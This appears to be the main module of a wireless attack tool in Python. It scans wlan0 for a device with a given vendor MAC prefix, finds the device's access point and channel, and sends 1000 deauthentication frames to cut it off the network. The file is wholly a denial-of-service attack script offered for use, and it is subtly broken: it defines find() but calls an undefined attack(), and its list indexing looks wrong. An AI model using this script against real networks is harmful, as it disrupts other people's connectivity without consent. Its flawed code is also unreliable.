#!/usr/bin/python3

"""Main module for packet analyzation attack."""
from modules.device_analyzer import DeviceAnalyzer
from modules.wireless_traffic_analyzer import WirelessTrafficAnalyzer
from modules.interface_manager import InterfaceManager
from modules.denial_of_service import DenialOfService


def find(interface, vendor=None):
    analyzer = WirelessTrafficAnalyzer(interface, 10)
    devices = analyzer.get_devices(vendor)
    try:
        device = devices[6][0]
    except IndexError as error:
        print(f'[WARNING]',
              f'No device found for vendor {vendor}...')
        return

    aps = analyzer.get_aps(device)
    try:
        ap = aps[6][0]
    except IndexError as error:
        print(f'[WARNING]',
              f'No AP found for device {device}...')
        return

    device_analyzer = DeviceAnalyzer(device, interface)
    channel = device_analyzer.get_channels()

    device_analyzer.visualize_packets(channel)

    dos = DenialOfService(interface, channel)
    dos.deauth(device, ap, 1000)

    return True


if __name__ == '__main__':

    interface = "wlan0"
    vendor = "64:16:66"

    attack(interface, vendor)
